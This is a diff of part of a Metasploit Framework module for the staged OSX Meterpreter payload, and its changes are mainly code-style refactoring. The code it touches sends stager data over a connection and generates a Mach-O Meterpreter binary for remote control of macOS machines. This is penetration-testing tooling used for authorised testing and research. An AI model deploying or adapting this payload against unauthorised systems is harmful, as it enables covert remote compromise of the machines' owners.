@@ -3,35 +3,36 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 module MetasploitModule
   include Msf::Sessions::MeterpreterOptions
   include Msf::Sessions::MettleConfig
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'          => 'OSX Meterpreter',
-      'Description'   => 'Inject the mettle server payload (staged)',
-      'Platform'      => 'osx',
-      'Author'        => [
-        'parchedmind',  # osx_runbin
-        'nologic',      # shellcc
-        'timwr',        # metasploit integration
+    super(
+      update_info(
+        info,
+        'Name' => 'OSX Meterpreter',
+        'Description' => 'Inject the mettle server payload (staged)',
+        'Platform' => 'osx',
+        'Author' => [
+          'parchedmind',  # osx_runbin
+          'nologic',      # shellcc
+          'timwr',        # metasploit integration
         ],
-      'References'    => [
+        'References' => [
           [ 'URL', 'https://github.com/CylanceVulnResearch/osx_runbin' ],
           [ 'URL', 'https://github.com/nologic/shellcc' ]
         ],
-      'Arch'         => ARCH_X64,
-      'License'      => MSF_LICENSE,
-      'Session'      => Msf::Sessions::Meterpreter_x64_OSX,
-      'Convention'   => 'sockedi',
+        'Arch' => ARCH_X64,
+        'License' => MSF_LICENSE,
+        'Session' => Msf::Sessions::Meterpreter_x64_OSX,
+        'Convention' => 'sockedi'
       )
     )
   end
 
   def handle_intermediate_stage(conn, payload)
-    stager_file = File.join(Msf::Config.data_directory, "meterpreter", "x64_osx_stage")
+    stager_file = File.join(Msf::Config.data_directory, 'meterpreter', 'x64_osx_stage')
     data = File.binread(stager_file)
     macho = Msf::Payload::MachO.new(data)
     output_data = macho.flatten
@@ -111,17 +112,20 @@ module MetasploitModule
     )
     midstager = Metasm::Shellcode.assemble(Metasm::X64.new, midstager_asm).encode_string
     print_status("Transmitting first stager...(#{midstager.length} bytes)")
-    conn.put(midstager) == midstager.length
+    conn.put(midstager)
+    midstager.length
 
-    Rex::sleep(0.1)
+    Rex.sleep(0.1)
     print_status("Transmitting second stager...(#{output_data.length} bytes)")
     conn.put(output_data) == output_data.length
   end
 
   def generate_stage(opts = {})
-    config_opts = {scheme: 'tcp'}.merge(mettle_logging_config(opts))
-    mettle_macho = MetasploitPayloads::Mettle.new('x86_64-apple-darwin',
-      generate_config(opts.merge(config_opts))).to_binary :exec
+    config_opts = { scheme: 'tcp' }.merge(mettle_logging_config(opts))
+    mettle_macho = MetasploitPayloads::Mettle.new(
+      'x86_64-apple-darwin',
+      generate_config(opts.merge(config_opts))
+    ).to_binary :exec
     mettle_macho[0] = 'b'
     mettle_macho
   end
